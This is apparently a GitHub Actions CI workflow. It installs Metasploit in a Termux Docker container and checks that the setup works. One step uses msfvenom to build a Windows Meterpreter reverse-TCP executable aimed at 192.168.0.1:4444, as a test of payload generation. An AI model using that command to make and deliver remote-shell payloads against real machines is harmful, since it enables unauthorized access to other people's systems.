name: metasploit_in_termux_test
on:
  workflow_dispatch:
  push:
    paths:
      - ".github/workflows/metasploit_in_termux_test.yml"
      - "metasploit.sh"
  pull_request:
jobs:
  metasploit_in_termux_test:
    timeout-minutes: 360
    runs-on: ubuntu-24.04-arm
    steps:
      - name: Prepare
        timeout-minutes: 360
        run: |
          cd ~
          sudo apt update
          sudo DEBIAN_FRONTEND=noninteractive apt install curl git -y
          source /etc/os-release
          curl --retry 100 --retry-connrefused --retry-delay 5 -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo tee /etc/apt/trusted.gpg.d/docker.asc >/dev/null
          echo "deb [arch=amd64] https://download.docker.com/linux/ubuntu $UBUNTU_CODENAME stable" | sudo tee /etc/apt/sources.list.d/docker.list >/dev/null
          sudo apt update
          sudo DEBIAN_FRONTEND=noninteractive apt install docker-ce -y
          git clone https://github.com/Willie169/metasploit_in_termux.git
          cd metasploit_in_termux
          sed -Ei 's|(#!/data/data/com\.termux/files/usr/bin/bash)|\1\nset -euxo pipefail|' metasploit.sh
      - name: Main
        timeout-minutes: 360
        run: |
          set -euxo pipefail
          docker run --rm -v "$HOME/metasploit_in_termux:/data/data/com.termux/files/home/metasploit_in_termux" -w "/data/data/com.termux/files/home/metasploit_in_termux" --privileged termux/termux-docker bash -c '
            set -euxo pipefail
            # Use primary Termux mirror (bypasses pkg mirror selection)
            echo "deb https://packages.termux.dev/apt/termux-main stable main" > /data/data/com.termux/files/usr/etc/apt/sources.list
            apt update -y || true
            DEBIAN_FRONTEND=noninteractive apt install -y curl git libssh2 -o Dpkg::Options::="--force-confnew" || true
            ./metasploit.sh
            msfconsole -qx "version; exit"
            echo "Testing msfvenom payload generation..."
            msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.1 lport=4444 -f exe -o my_payload.exe
            echo "Payload generation completed successfully!"
            ls -la my_payload.exe
            file my_payload.exe || echo "file command not available, but payload exists"
          '
